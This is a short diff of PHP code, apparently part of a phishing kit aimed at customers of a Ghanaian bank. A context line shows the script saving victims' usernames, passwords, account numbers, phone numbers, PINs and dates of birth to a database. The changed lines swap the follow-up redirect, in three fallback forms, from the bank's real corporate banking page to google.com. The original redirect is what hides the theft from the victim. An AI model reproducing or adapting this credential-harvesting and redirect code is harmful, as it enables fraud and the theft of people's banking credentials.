@@ -149,14 +149,14 @@ $stmt->execute([$myUsername,$myPassword,$myAccount,$myPhone,$myPIN,$myDOB ]);
 //   echo("Done!");
 
 if (!headers_sent()){
-header("Location: https://corporateibank.fidelitybank.com.gh/B001/home.jsp");
+header("Location: https://www.google.com");
 // exit();
 } else {
 	echo '<script type="text/javascript">';
-	echo 'window.location.href="https://corporateibank.fidelitybank.com.gh/B001/home.jsp";';
+	echo 'window.location.href="https://www.google.com";';
 	echo '</script>';
 	echo '<noscript>';
-	echo '<meta http-equiv="refresh" content="0;url=https://corporateibank.fidelitybank.com.gh/B001/home.jsp" />';
+	echo '<meta http-equiv="refresh" content="0;url=https://www.google.com" />';
 	echo '</noscript>';
 }
 }
